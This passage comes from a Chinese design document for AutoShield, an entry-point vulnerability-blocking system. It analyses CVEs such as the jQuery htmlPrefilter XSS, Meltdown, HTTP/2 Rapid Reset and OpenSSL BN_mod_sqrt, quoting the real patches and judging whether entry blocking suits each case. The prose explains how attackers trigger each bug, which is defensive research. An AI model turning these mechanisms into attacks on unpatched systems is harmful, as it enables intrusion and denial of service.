**适用正例：CVE-2020-11022，jQuery `htmlPrefilter` XSS。**

**漏洞原理：** jQuery 的 `htmlPrefilter` 会用正则把 `<tag/>` 形式改写成 `<tag></tag>`。对已经经过 sanitizer 的不可信 HTML，这次二次改写可能改变浏览器解析树，把原本位于安全文本或特殊标签上下文中的内容重新解释为可执行 HTML，从而恢复脚本或事件处理器并触发 XSS。

**真实补丁：** 停止对传入 HTML 做这类自闭合标签重写：

```javascript
htmlPrefilter = function(html) {
  return html;
};
```

**AutoShield 判断：** 如果 Policy 挂在确定的 DOM HTML sink，且能够获得完整 HTML、sanitizer 标记与明确的 HTML 上下文，可以拒绝危险调用。该例也说明临时阻断不能擅自改写输入，只能安全返回错误。

**错误返回值合法性：** 当前不能认定存在通用合法错误值。`htmlPrefilter()` 的契约是返回 HTML 字符串；返回 `null`/异常可能使大量调用者崩溃，返回空串会静默删除内容，返回原字符串则恰好等价于该案例的正式修复但属于“替换返回值”而非 AutoShield 现有的 BLOCK 语义。除非增加经过验证的字符串 passthrough adapter，或改挂到具有显式错误路径的上层 DOM sink，否则本例只能标为判定可行、阻断动作待验证，不能直接 ENFORCE。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2020-11022)、[jQuery 补丁 1d61fd9](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)。

**不适用反例：CVE-2021-21383，Wiki.js/Vue stored XSS。**

**漏洞原理：** 攻击者把包含 Vue mustache 表达式的内容保存到 wiki 代码块中。Markdown 渲染后内容位于 `<pre>`，看起来只是代码文本，但页面随后被 Vue 接管；Vue 仍会编译 `<pre>` 中的 mustache 表达式，使存储的 payload 在其他用户查看页面时执行，形成 stored XSS。

**真实补丁：** 在渲染输出的 `<pre>` 上加入 `v-pre`，明确告诉 Vue 不要编译该子树：

```javascript
for (const pre of document.querySelectorAll("pre"))
  pre.setAttribute("v-pre", true);
```

**AutoShield 判断：** 存储入口不知道未来渲染上下文，通用输出函数又可能不知道 Vue 是否继续编译该节点。没有跨层输出上下文时，单入口字符串 Policy 容易误拒或漏报。

**错误返回值合法性：** 不适用。存储入口返回 4xx 会拒绝可能在其他上下文完全安全的内容，渲染入口返回空 HTML/异常又可能破坏整页并触发 SSR 或客户端重试；返回值选择不能替代缺失的 Vue 编译上下文。只有在明确的 Vue sink 处存在可验证的安全渲染失败路径时才可重新评估。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2021-21383)、[Wiki.js 补丁 5ffa189](https://github.com/Requarks/wiki/commit/5ffa189383dd716f12b56b8cae2ba0d075996cf1)。

### 10.20 CWE-200：敏感信息暴露

**适用正例：CVE-2018-16658，Linux CD-ROM ioctl 信息泄露。**

**漏洞原理：** ioctl 的 `arg` 是 `unsigned long`，但旧边界检查先把它转换成较窄的 `int`。攻击者提供超过 `INT_MAX` 的大值时，截断/符号转换会得到负数或较小值，从而绕过 `arg >= capacity` 检查。后续代码仍使用原始大值访问 drive slot/状态数据，可能读出越界内核内存。

**真实补丁：** 删除窄化转换，直接使用原始宽度比较：

```c
if (arg >= capacity)
    return -EINVAL;
```

**AutoShield 判断：** ioctl 参数和 capacity 在入口可读，既有错误返回明确，因此可以通过入口拒绝防止读取越界内核数据。

**错误返回值合法性：** 同一 ioctl 路径已有的 `-EINVAL` 是候选合法，表示参数范围无效，并且在读取 drive slot 前返回。仍需枚举 compat ioctl 和用户态调用者，确认不会把 `EINVAL` 当成“不支持该 ioctl”后改走更弱的旧接口，也不会对同一参数忙重试；若存在这种 fallback，应选择更精确且已被调用者接受的错误路径或扩大保护点。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2018-16658)、[Linux 补丁 8f3fafc](https://github.com/torvalds/linux/commit/8f3fafc9c2f0ece10832c25f7ffcb07c97a32ad4)。

**不适用反例：CVE-2017-5754，Meltdown。**

**漏洞原理：** 乱序 CPU 在权限检查完成前推测执行对内核地址的加载。虽然非法访问最终被回滚并产生异常，但被读取的秘密值已经影响 cache line。攻击者通过测量不同地址的访问时间，能够从缓存侧信道恢复秘密数据；架构状态看起来没有执行成功，却已经留下微架构痕迹。

**真实补丁/缓解：** 使用 Kernel Page Table Isolation 将大部分内核映射从用户页表移除，并结合微码、编译器和架构级防护减少推测访问。

**AutoShield 判断：** 只读 Policy 既无法观察 speculative access，也无法改变页表隔离或 CPU 推测行为，因此该 CWE-200 实例明确 out-of-scope。

**错误返回值合法性：** 不适用。架构异常或系统调用错误发生在推测痕迹留下之后，选择任何返回值都不能消除 cache side effect；频繁 fault 还可能扩大可观察信号。该实例必须依赖页表、微码和架构级缓解。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2017-5754)、[Google Project Zero 分析](https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html)、[Linux KPTI 文档](https://www.kernel.org/doc/html/latest/arch/x86/pti.html)。

### 10.21 CWE-400：资源耗尽总类

**范围反例：CVE-2023-44487，HTTP/2 Rapid Reset。**

**漏洞原理：** HTTP/2 客户端可以在同一连接上创建 stream，并立即发送 `RST_STREAM` 取消它。取消会让 stream 很快从并发计数中移除，因此攻击者无需等待响应即可连续创建、取消海量请求；服务器却已经为每个请求执行解析、路由或后端工作，形成极高的 CPU/请求放大。

**真实补丁/缓解：** 不同服务器分别增加 reset/stream 速率计数、异常连接关闭、并发限制和调度保护。

**AutoShield 判断：** 该案例说明 CWE-400 过宽，不能直接映射为统一 Policy。只有选定具体实现和子谓词后，才能归入 CWE-770 或协议级限速，例如：

```text
BLOCK：单位连接、单位时间窗口内的 reset 数超过实现 SLO
```

**错误返回值合法性：** 当前没有统一合法动作。拒绝单个 stream、发送 `GOAWAY`、直接关闭连接和静默丢弃的协议语义及成本完全不同；发送可被对端继续触发的错误帧甚至会增加 CPU/带宽放大。必须按具体 HTTP/2 实现验证一个终止型、速率受限且不会被自动重试的动作，因此本范围反例保持“不建议直接目标”。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2023-44487)、[CISA 公告](https://www.cisa.gov/news-events/alerts/2023/10/10/http2-rapid-reset-vulnerability-cve-2023-44487)、[Netty 修复提交](https://github.com/netty/netty/commit/58f75f665aa81a8cbcf6ffa74820042a285c5e61)。

### 10.22 CWE-835：无限循环

**适用正例：CVE-2022-0778，OpenSSL `BN_mod_sqrt()` 无限循环。**

**漏洞原理：** `BN_mod_sqrt()` 的算法假定 modulus `p` 为素数，并在循环中寻找满足 `b^(2^i) == 1` 的最小 `i`。攻击者通过证书中的显式椭圆曲线参数提供非素数 `p`，破坏算法前提；旧 `while` 循环没有可靠上界，在某些输入下永远找不到终止条件，解析证书的线程因此永久占用 CPU。

**真实补丁：** 把无界 `while` 改为由算法变量 `e` 限制的 `for` 循环，并在没有找到结果时返回错误：

```c
for (i = 1; i < e; i++) {
    ...
    if (is_one(t))
        break;
}
if (i == e)
    return NOT_A_SQUARE;
```

**AutoShield 判断：** `p` 和本次运算参数在函数入口可得，但精确危险条件不是一个简单的“`p` 非素数”谓词。改进设计应运行漏洞相关的只读大整数语义切片，复现由 `e` 限制的搜索；如果在正式补丁的上界内找不到 `b^(2^i) == 1`，则阻断旧函数。该 Policy 需要有界循环和只读大整数 adapter；当前原型不支持，完整 DSL 见 [PATCH_DSL_CASE_STUDIES.md](PATCH_DSL_CASE_STUDIES.md)。若执行预算不足则返回 `UNKNOWN`，不能用粗糙的参数黑名单冒充精确判断。

**错误返回值合法性：** `BN_mod_sqrt()` 的指针失败契约是返回 `NULL`，并由 OpenSSL 错误栈说明原因；这是比默认整数错误更合适的候选。必须同时复现必要的 error-stack 设置，并确认所有证书、密钥和参数解析调用者都判空、释放中间 `BIGNUM`、终止当前解析且不会用同一显式曲线参数无限重试。只返回 `NULL` 而不满足这些传播条件仍不算合法。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2022-0778)、[OpenSSL 补丁 a466912](https://github.com/openssl/openssl/commit/a466912611aa6cbdf550cd10601390e587451246)。

**不适用边界例：CVE-2018-1999012，FFmpeg PVA demuxer 无限循环。**

**漏洞原理：** PVA demuxer 循环扫描输入以寻找下一包。当畸形文件让读取逻辑到达 EOF，却没有消费新字节、更新位置或返回错误时，循环会在同一输入位置重复执行。是否失去进展只有在 parser 实际运行并观察文件位置变化后才能确定。

**真实补丁：** 在 demux 循环内部检测 EOF，并在没有输入进展时返回：

```c
if (avio_feof(input))
    return EOF;
```

**AutoShield 判断：** 问题取决于 parser 执行过程中是否持续取得进展，而不是一个简单入口上界。除非 Policy 能在入口安全、完整地解析整个 PVA 流，否则不应声称可以预判该实例。

**错误返回值合法性：** 不适用。FFmpeg 的 EOF/`AVERROR_EOF` 是内部确认无进展后的合法动作，但在函数入口提前返回 EOF 可能把尚有数据的畸形流误报为正常结束，并让上层接受截断输出或切换 demuxer。返回码相同不代表执行阶段等价。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2018-1999012)、[FFmpeg 补丁 9807d39](https://github.com/FFmpeg/FFmpeg/commit/9807d3976be0e92e4ece3b4b1701be894cd7c2e1)。

### 10.23 CWE-401/772：内存或资源泄漏

**不适用示例：CVE-2019-19073，Linux ath9k HTC timeout 路径内存泄漏。**

**漏洞原理：** ath9k HTC 配置函数先分配 `skb`，把它提交给设备/固件，然后等待 completion。发生 timeout 时，旧错误路径直接返回，却没有释放本次已经分配但未被正常消费的 `skb`。攻击者反复触发 timeout，即可持续积累不可回收的内核内存并造成 DoS。

**真实补丁：** 在三个 timeout 失败退出路径增加 `kfree_skb(skb)`：

```text
allocate skb → submit request → wait
                         └→ timeout: free skb before return
```

**AutoShield 判断：** 泄漏取决于函数内部已经完成分配、提交和等待之后的失败路径。入口提前返回可以粗暴禁用整个功能，但不能在保留正常调用的同时补上内部清理动作，因此不属于 AutoShield 的细粒度入口修复范围。

**错误返回值合法性：** 不适用。timeout 错误在“已分配并提交 skb”之后才合法地要求清理；把同一错误码从入口返回虽然不会产生本次 skb 泄漏，却会禁用所有调用，且可能触发固件配置重试。AutoShield 又不能在内部 timeout 点执行 `kfree_skb()`，因此不存在既保留正常功能又完成正确清理的入口返回动作。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2019-19073)、[Linux 补丁 853acf7](https://github.com/torvalds/linux/commit/853acf7caf10b828102d92d05b5c101666a6142b)。

---

## 11. 实验优先级

### 第一阶段

优先选择入口谓词清晰、Oracle 容易建立的漏洞：

- CWE-787：越界写；
- CWE-125：越界读；
- CWE-190/191：整数溢出/下溢；
- CWE-476：空指针解引用；
- CWE-20：具体的范围、长度或枚举检查缺失。

### 第二阶段

用于验证受控 Observer 和私有状态：

- CWE-416：Use-After-Free；
- CWE-415：Double Free；
- CWE-770：资源配额；
- CWE-362：已知危险状态组合的竞态。

第二阶段必须明确区分“设计能力”和“当前已实现能力”，并单独评估状态陈旧、并发一致性和 Observer 生命周期。

---

## 12. 当前实现与设计差距

当前原型已经具备：

- 自定义 eBPF 子集 VM；
- 用户态 hook 和内核 kprobe 模块；
- Python 与运行时双轨 Verifier；
- `get_arg`、`safe_read_u8`、`get_reg` Helper 白名单；
- 基础安全、鲁棒性和性能 smoke 测试。

本文设计中尚待落地的主要能力包括：

- LLM 到受限 Policy IR 的完整生成闭环；
- 条件到证据的自动映射；
- DRP/RUP 静态分析；
- 独立 Oracle 和差分测试矩阵；
- OBSERVE 与 `would_block` 遥测；
- 正常误拒率、攻击漏报率和重试放大率统计；
- 返回值契约的全调用点验证；
- 多点受控 Observer；
- 跨过程只读语义切片、有界调用图与 typed adapter；
- 安全失败边界发现，以及父调用链资源清理/重试契约验证；
- C++/Java 异常和特殊返回类型 adapter；
- 旧策略 enforce、新策略 shadow 的升级与回退机制。

在这些能力实现和评估前，论文与文档必须避免将其描述为已有功能。

---

## 13. 参考工作及迁移关系

| 工作 | 原始方法 | 对 AutoShield 的主要启示 |
|------|----------|--------------------------|
| KLAUS, USENIX Security 2023 | 识别补丁改变的 AWRP，并用定向 fuzzing 寻找错误补丁反例 | 使用 DRP 检查漏洞判定读取，使用 RUP 检查提前返回的下游影响；不能以重放 PoC 代替正确性验证 |
| Pilot Execution, NSDI 2026 | 在生产环境隔离 dry-run 恢复动作，提交前观察结果 | 分离 Policy 求值与真实阻断；使用 OBSERVE、旧策略 enforce + 新策略 shadow、canary 部署 |
| Talos, S&P 2016 | 入口禁用函数并复用错误返回路径 | 返回值必须独立验证；功能保留和可用性损失必须量化；错误返回可能导致崩溃而非仅仅误拒 |
| PET, USENIX Security 2023 | Sanitizer 驱动的危险点拦截与 checkpoint/restore | 函数中部阻断会扩大状态恢复和审核面；AutoShield 应保持入口边界并拒绝不适用实例 |
| VulShield, NDSS 2025 | Sanitizer 驱动的约束生成、检测点选择和运行时阻断 | 入口约束是重要基线；审核成本优势必须通过共同案例和人工实验验证 |
